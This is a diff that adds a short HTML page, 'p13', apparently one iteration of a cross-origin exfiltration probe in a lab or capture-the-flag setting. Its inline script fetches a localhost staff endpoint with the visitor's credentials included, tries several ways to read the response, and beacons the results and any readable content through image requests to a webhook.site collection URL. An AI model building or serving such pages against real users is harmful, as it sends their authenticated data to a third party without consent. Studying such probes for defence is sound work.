@@ -1,0 +1,16 @@
+<!doctype html><html><head><title>p13</title></head><body>p13
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+var G="https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,900));}catch(e){}}
+b("start13","1");
+fetch(G,{mode:"no-cors",credentials:"include"}).then(async function(r){
+  b("type", r.type+"|"+r.status+"|body="+r.body);
+  for (const m of ["text","arrayBuffer","blob"]) {
+    try { const v = await r[m](); b(m+"_ok", (v.byteLength!==undefined? v.byteLength : (v.size!==undefined? v.size : String(v).length))+"|"+String(v).slice(0,200)); }
+    catch(e){ b(m+"_err", e.name+":"+e.message.slice(0,100)); }
+  }
+  try { const c=r.clone(); b("clone","ok"); } catch(e){ b("clone_err", e.name); }
+  try { const rd = r.body && r.body.getReader(); b("reader", rd? "ok":"null"); } catch(e){ b("reader_err", e.name); }
+}, function(e){ b("fetch_err", e.name+":"+e.message); });
+</script></body></html>
